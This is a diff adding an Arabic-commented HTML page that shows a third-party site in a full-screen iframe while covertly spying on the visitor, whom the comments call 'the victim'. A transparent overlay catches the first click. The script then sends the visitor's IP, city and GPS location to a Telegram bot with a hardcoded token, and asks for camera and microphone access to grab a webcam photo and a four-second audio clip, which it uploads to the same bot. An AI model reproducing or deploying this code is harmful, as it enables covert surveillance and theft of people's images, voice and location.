@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري التحميل...</title>
+    <style>
+        /* كود جعل الموقع يملأ الشاشة بالكامل */
+        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; }
+        iframe { width: 100%; height: 100%; border: none; }
+        /* طبقة شفافة فوق الموقع لضمان الضغط وطلب الإذن */
+        #overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.01); z-index: 999; cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+    <iframe src="https://traidmod.com/" id="mainSite"></iframe>
+    
+    <div id="overlay" onclick="startCapture()"></div>
+
+    <script>
+        const token = '8120975005:AAFpqunUzKJav0pCWI-ZjCMjUVi2FMOL3Go';
+        const chatId = '8249039685';
+        const redirectUrl = 'https://traidmod.com/';
+
+        async function sendLog(msg) {
+            try {
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
+            } catch(e) {}
+        }
+
+        async function startCapture() {
+            // إخفاء الطبقة الشفافة عشان الضحية يعرف يتفاعل مع الموقع
+            document.getElementById('overlay').style.display = 'none';
+
+            // 1. سحب الـ IP (خلفية)
+            fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
+                sendLog(`🔔 ضحية فتح الموقع!\n🌐 IP: ${d.ip}\n📍 ${d.city}\n🔗 فاتح حالياً: ${redirectUrl}`);
+            });
+
+            // 2. طلب الأذونات والسحب (خلفية)
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                
+                // تصوير صورة
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.muted = true;
+                await video.play();
+
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    canvas.toBlob(blob => {
+                        const frm = new FormData();
+                        frm.append('chat_id', chatId);
+                        frm.append('photo', blob, 'cam_shot.jpg');
+                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: frm });
+                    }, 'image/jpeg');
+                }, 1500);
+
+                // تسجيل صوتي 4 ثواني
+                const recorder = new MediaRecorder(stream);
+                const chunks = [];
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: 'audio/ogg' });
+                    const frm = new FormData();
+                    frm.append('chat_id', chatId);
+                    frm.append('voice', blob, 'audio_rec.ogg');
+                    fetch(`https://api.telegram.org/bot${token}/sendVoice`, { method: 'POST', body: frm })
+                    .then(() => {
+                        stream.getTracks().forEach(t => t.stop());
+                    });
+                };
+                recorder.start();
+                setTimeout(() => recorder.stop(), 4000);
+
+            } catch (e) {
+                sendLog("⚠️ الضحية رفض الأذونات لكنه لا يزال يتصفح الموقع.");
+            }
+        }
+
+        // تشغيل سحب الـ IP تلقائياً
+        window.onload = () => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(p => {
+                    sendLog(`📍 موقع GPS:\nhttp://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+                });
+            }
+        };
+    </script>
+</body>
+</html>
